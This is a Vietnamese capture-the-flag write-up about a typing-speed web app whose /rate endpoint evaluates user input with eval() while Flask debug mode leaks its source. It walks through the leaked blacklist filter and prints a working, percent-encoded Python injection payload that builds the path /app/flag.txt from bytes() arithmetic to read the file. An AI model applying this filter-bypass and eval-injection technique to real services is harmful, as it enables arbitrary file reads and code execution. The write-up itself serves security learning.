https://private-user-images.githubusercontent.com/168398753/633276510-a9aeda2a-08df-469a-abb1-4902fe48bf57.png?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3ODYyMDE1NDYsIm5iZiI6MTc4NjIwMTI0NiwicGF0aCI6Ii8xNjgzOTg3NTMvNjMzMjc2NTEwLWE5YWVkYTJhLTA4ZGYtNDY5YS1hYmIxLTQ5MDJmZTQ4YmY1Ny5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjYwODA4JTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI2MDgwOFQxNTAwNDZaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT03YjFhNzc3NTFkZDY1NjdiODVhNWIzM2M4NTU3ZDViMGQzNTk2ZWY3YjczNmQwYzE4MzRmZjUyODFiOWNhYzAyJlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCZyZXNwb25zZS1jb250ZW50LXR5cGU9aW1hZ2UlMkZwbmcifQ.XLbO9wDIIgqiCZeoSUHxJr2QJV9kdCJOzGNtvQkkTT0

Mở chall thấy đây là app đo tốc độ gõ phím wpm = words per minute). Người dùng gõ, app chấm điểm tốc độ.
- View-source / Network tab trong trình duyệt => thấy frontend gọi tới một endpoint để lấy kết quả chấm điểm.
- Probe các path phổ biến: /rate, /flag, /admin, /source, /robots.txt, /static... vừa để tìm endpoint chức năng vừa để tìm file/source rò rỉ.
/rate trả JSON {"verdict":"slow","wpm":49.0} → đây là endpoint duy nhất có logic. Tên rate = "chấm điểm", khớp chủ đề app.
ta thử /rate?wpm=open


chính tỏ eval(wpm) đã chạy, wpm=open được nhét vào eval(open), rồi code rate() gọi open < 50 (so sánh hàm với số) => TypeError. Lỗi này chỉ xảy ra nếu open được thực thi. Nếu không có eval, bạn chỉ nhận JSON invalid wpm như bình thường.
2. debug=True đang bật — nhờ đó mới hiển thị full traceback và cả source code route (kèm dòng return jsonify(verdict=rate(eval(wpm.lower())), wpm=float(wpm)))

Gửi wpm=check(open):
<img width="1917" height="950" alt="2" src="https://github.com/user-attachments/assets/52536d4e-dbb7-40fb-8e6b-b592ddbc81ee" />

Khi hàm check nhận tham số không phải là chuỗi, chẳng hạn như số nguyên, chương trình sẽ cố gắng thực thi data.lower(). Vì số nguyên không có phương thức lower(), Python ném ra ngoại lệ AttributeError ngay bên trong hàm check.
Debugger bắt lỗi này và tự động in ra toàn bộ mã nguồn của hàm check, kèm theo dòng lệnh gây lỗi và giá trị của tham số data. Điều này vô tình làm lộ logic xử lý bên trong ứng dụng, tạo điều kiện cho kẻ tấn công khai thác thêm các lỗ hổng khác.

<img width="1917" height="542" alt="3" src="https://github.com/user-attachments/assets/774a47ed-a503-4d6e-a31c-da2e6d7c80c6" />

Đọc source này ra 3 luật
1. Blacklist substring: . _ ' " , = ; : ^ / > < { } và từ import, eval, exec, chr, ord, int, str, len, set, app, flask… — nếu payload chứa chuỗi con nào → bị chặn.
2. Non-ASCII: ký tự < 32 hoặc > 126 → bị chặn.
3. len(set(string)) > 18 → payload tối đa 18 ký tự unique ← rào cản quyết định.
check() chỉ soi ký tự literal có trong chuỗi payload. Nó không bao giờ decode nội dung của bytes([...])
- Không viết được ' => nhưng bytes([47]) tạo ra b'/' mà check không nhìn thấy ' hay /.
- Không viết được chữ a => nhưng bytes([3+47+47]) = b'a' mà check không thấy chữ a.

=> Toàn bộ path /app/flag.txt được xây từ bytes([giá_trị]) + phép cộng byte.
Giờ cần biến ký tự thành số rồi nén vào 18 ký tực:
Bảng mã ASCII — mỗi ký tự = 1 số: /=47, a=97, p=112, f=102, l=108, g=103, .=46, t=116, x=120.
Nén ký tự unique — chỉ dùng digits {3,4,7} + ops {+,*} (5 ký tự) để viết mọi số đó: 47→47, 97→3+47+47, 112→4*4*7, 102→3*34, 108→34+74, 103→4+3*33, 46→3+43, 116→43+73, 120→43+77.
Vì open(next(open( + bytes([ + ]) + + đã tốn 13 ký tự unique, cộng {3,4,7,+,*} = vừa đúng 18.
/app/flag.txt ra được open(next(open(bytes([47])+bytes([3+47+47])+bytes([4*4*7])+bytes([4*4*7])+bytes([47])+bytes([3*34])+bytes([34+74])+bytes([3+47+47])+bytes([4+3*33])+bytes([3+43])+bytes([43+73])+bytes([43+77])+bytes([43+73]))))
Trong URL "+" có nghĩa khoảng trắng nên dán payload thô vào ?wpm= là hỏng. Phải percent-encode lại thành:
open%28next%28open%28bytes%28%5B47%5D%29%2Bbytes%28%5B3%2B47%2B47%5D%29%2Bbytes%28%5B4%2A4%2A7%5D%29%2Bbytes%28%5B4%2A4%2A7%5D%29%2Bbytes%28%5B47%5D%29%2Bbytes%28%5B3%2A34%5D%29%2Bbytes%28%5B34%2B74%5D%29%2Bbytes%28%5B3%2B47%2B47%5D%29%2Bbytes%28%5B4%2B3%2A33%5D%29%2Bbytes%28%5B3%2B43%5D%29%2Bbytes%28%5B43%2B73%5D%29%2Bbytes%28%5B43%2B77%5D%29%2Bbytes%28%5B43%2B73%5D%29%29%29%29
Và ra được flag
<img width="1917" height="961" alt="4" src="https://github.com/user-attachments/assets/1d15625c-b322-4a28-b288-c706c0ac79fd" />
